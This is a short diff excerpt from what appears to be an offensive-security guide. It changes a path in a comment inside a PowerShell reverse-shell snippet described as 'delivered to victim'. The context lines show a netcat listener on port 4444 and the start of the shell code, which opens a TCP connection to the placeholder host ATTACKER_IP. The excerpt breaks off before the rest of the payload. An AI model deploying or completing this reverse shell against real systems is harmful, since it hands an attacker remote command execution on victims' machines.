@@ -67,7 +67,7 @@ nc -lvnp 4444
 
 **PowerShell reverse shell (delivered to victim):**
 ```powershell
-# See scripts/reverse-shell.ps1
+# See scripts/reverse-shell/reverse.ps1
 $client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP", 4444)
 $stream = $client.GetStream()
 [byte[]]$bytes = 0..65535 | %{0}
